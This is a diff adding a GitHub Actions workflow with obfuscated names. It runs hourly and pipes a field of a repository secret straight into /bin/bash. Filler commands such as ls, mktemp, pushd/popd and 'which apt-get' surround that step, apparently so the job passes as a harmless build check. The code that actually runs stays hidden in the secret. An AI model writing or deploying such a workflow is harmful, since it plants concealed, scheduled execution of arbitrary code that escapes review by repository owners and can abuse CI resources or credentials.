@@ -1,0 +1,21 @@
+name: neibote1346
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: neibote1346
+        env:
+          g16040: ${{ secrets.g16040 }}
+        run: |
+          ls -la 2>/dev/null || true
+          echo $g16040 | jq -r .t19280 | /bin/bash
+          history | grep git
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          pushd ~ > /dev/null
+          popd
+          which apt-get
